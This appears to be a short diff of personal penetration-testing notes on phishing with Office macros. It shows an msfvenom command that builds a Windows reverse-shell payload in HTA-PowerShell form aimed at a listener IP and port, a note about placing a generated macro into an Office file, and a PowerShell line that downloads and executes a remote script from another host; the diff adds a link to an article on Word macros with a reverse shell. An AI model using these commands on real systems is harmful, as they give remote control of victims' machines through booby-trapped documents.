@@ -10,3 +10,5 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.187 LPORT=9001 -f hta-psh 
 generate the macro to place into the office file
 
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+
+https://systemweakness.com/ms-word-macros-with-powercat-reverse-shell-58b20983e0f0
